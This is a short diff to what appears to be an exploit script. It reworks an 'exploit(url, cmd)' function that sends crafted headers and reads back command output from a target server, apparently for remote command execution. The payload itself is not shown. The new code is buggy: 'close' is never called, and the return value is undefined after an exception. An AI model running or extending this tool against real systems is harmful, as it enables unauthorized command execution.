@@ -91,13 +91,18 @@ def exploit(url, cmd):
     }
 
     timeout = 3
+    s = []
     try:
-        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
-    except Exception as e:
-        print("EXCEPTION::::--> " + str(e))
-        output = 'ERROR'
-    return(output)
-
+        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False, stream=True)
+        if output.encoding is None:
+            output.encoding = 'utf-8'
+        for line in output.iter_content(chunk_size=None,decode_unicode=True):
+            s.append(line)
+            command_response = "".join(s)
+        output.close 
+    except:
+        pass
+    return(command_response)
 
 def check(url):
     url = url_prepare(url)
